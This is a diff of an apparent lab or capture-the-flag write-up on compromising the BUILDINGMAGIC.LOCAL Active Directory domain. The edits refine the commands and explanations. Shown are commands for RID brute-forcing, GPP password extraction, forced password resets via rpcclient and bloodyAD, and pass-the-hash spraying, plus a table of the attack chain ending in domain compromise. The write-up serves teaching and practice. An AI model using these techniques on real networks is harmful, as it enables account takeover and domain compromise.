@@ -74,7 +74,7 @@ SMB  ...  Windows Server 2022  DC01  BUILDINGMAGIC.LOCAL
   IPC$    READ
 ```
 
-`r.widdleton` authenticates. Only `IPC$` is accessible — enough for LDAP/RID enumeration.
+`r.widdleton` authenticates. Only `IPC$` is accessible — enough for RID cycling via SMB. The same credentials also authenticate against LDAP (port 389) independently for BloodHound collection.
 
 ---
 
@@ -100,12 +100,12 @@ PORT     STATE    SERVICE        VERSION
 9389/tcp filtered adws
 ```
 
-The filtered status is a VPN/timing artefact — AD ports are reachable through NetExec and Impacket tools. Port `464` (Kerberos password change) is confirmed open.
+The filtered results are a VPN/timing artefact from running nmap without `-Pn` — all AD ports are reachable as confirmed by NetExec and Impacket succeeding against them. Port `464` (Kerberos password change) is the only one nmap confirmed open.
 
 ### User Enumeration via RID Cycling
 
 ```bash
-nxc smb 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --rid
+nxc smb 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --rid-brute
 ```
 
 Key users discovered:
@@ -175,7 +175,7 @@ NETLOGON  READ
 SYSVOL    READ
 ```
 
-Check SYSVOL for GPP passwords (Group Policy Preferences XML files stored `cpassword` fields encrypted with a key Microsoft published in 2012 — trivially crackable):
+Check SYSVOL for GPP passwords (Group Policy Preferences XML files containing `cpassword` fields encrypted with a key Microsoft published in 2012 — trivially crackable):
 
 ```bash
 nxc smb buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' -M gpp_password
@@ -204,7 +204,7 @@ bloodyAD -u r.haggard -p rubeushagrid -d buildingmagic.local -H 10.1.130.199 set
 **rpcclient alternative:**
 
 ```bash
-rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' 10.1.130.199 -c "setuserinfo2 H.POTCH 23 'NewPass123!'"
+rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' 10.1.130.199 -c "setuserinfo2 h.potch 23 'NewPass123!'"
 ```
 
 Check share access:
@@ -368,7 +368,7 @@ nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H '520126a03f5d5a8d836f1c4f34ede7ce' -
 [+] BUILDINGMAGIC.LOCAL\a.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)
 ```
 
-`a.flatch` shares the same password hash as the local Administrator — a classic password reuse scenario detectable only via Pass-the-Hash. BloodHound confirms `a.flatch` is a member of **Domain Admins** (marked with a high-value target diamond in BloodHound).
+`a.flatch` shares the same password hash as the local Administrator — a classic password reuse scenario exploitable via Pass-the-Hash without knowing the plaintext password. BloodHound confirms `a.flatch` is a member of **Domain Admins** (marked with a high-value target diamond in BloodHound).
 
 ![BloodHound — a.flatch Domain Admins membership](screenshots/bloodhound-domain-admin.png)
 
@@ -403,3 +403,4 @@ d-----  6/12/2025  1:37 PM        nssm-2.24
 | Lateral movement | WinRM access | Evil-WinRM |
 | Privilege escalation | SeBackupPrivilege → SAM/SYSTEM dump | reg save, secretsdump |
 | Domain compromise | Pass-the-Hash across domain users | NetExec |
+
